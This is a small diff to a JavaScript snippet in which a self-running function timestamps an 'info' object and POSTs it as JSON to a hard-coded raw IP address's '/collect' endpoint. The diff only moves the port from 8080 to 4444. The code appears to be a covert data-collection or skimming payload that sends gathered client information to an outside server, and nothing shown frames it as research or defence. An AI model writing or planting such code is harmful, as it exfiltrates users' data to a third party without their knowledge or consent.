@@ -30,9 +30,10 @@
     info.time = Date.now();
 
     // Send to your server
-    fetch("http://8.209.219.48:8080/collect", {
+    fetch("http://8.209.219.48:4444/collect", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify(info)
     });
 })();
+
